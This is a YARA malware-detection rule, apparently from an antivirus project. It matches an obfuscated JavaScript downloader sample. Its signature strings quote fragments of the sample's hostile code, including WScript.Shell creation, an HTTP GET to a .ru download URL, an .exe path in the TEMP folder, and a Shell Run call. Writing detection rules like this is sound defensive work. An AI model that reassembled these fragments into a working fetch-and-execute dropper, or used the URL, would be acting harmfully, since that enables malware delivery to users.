rule sig_20160401_a7ef621eb775aca5380ebdbe0360194a {
  meta:
    description = "datamaliciousorder - file 20160401_a7ef621eb775aca5380ebdbe0360194a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a6bc3cff4334d90a4952d486c808781b9a8af424972cd98de277256c6e02c1b3"

  strings:
    $s1  = "function LkDu(VxPl, XehXcz){DgAmj = DgAmj * 1; return VxPl - XehXcz;};" fullword ascii
    $s2  = "var KiCj = function XalBrd() {return WScript[GkrEjt](\"WScript\"+\".Shell\");}(), MuEi = 11;" fullword ascii
    $s3  = "if (XfwNv[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "XfwNv[LmTct](\"G\" + \"ET\", \"http://teamlight-pro.ru/j7esp\", false);" fullword ascii
    $s5  = "function DsYi() {return KiCj[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"laHk4pZaDDIiZ.ex\" + \"e\";};" fullword ascii
    $s6  = "function UlXns(){return KsBr + \"\";};" fullword ascii
    $s7  = "function RitPd() {return ((QjIvy == true) && (QjIvy == HgbCvo)) ? 1 : DgAmj;};" fullword ascii
    $s8  = "var QjIvy = false;" fullword ascii
    $s9  = "function AxvKrs(){return GkrEjt;};" fullword ascii
    $s10 = "return LkDu(ExgPs, MmEe);" fullword ascii
    $s11 = "function JkOjr(){return 23;};" fullword ascii
    $s12 = "function JnpAb()" fullword ascii
    $s13 = "}while (FrqZe);" fullword ascii
    $s14 = "var LdPip = new this[\"Date\"]();" fullword ascii
    $s15 = "HgbCvo = true; " fullword ascii
    $s16 = "var ElcLdp = false;" fullword ascii
    $s17 = "function DzsQm(DkKyk) {var ZxVbk = (1, 2, 3, 4, 5, DkKyk); return ZxVbk;};" fullword ascii
    $s18 = "QjIvy = true; " fullword ascii
    $s19 = "var HgbCvo = false;" fullword ascii
    $s20 = "function BmiAa(GxPw){KiCj[\"R\"+\"un\"](GxPw, DgAmj, DgAmj);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}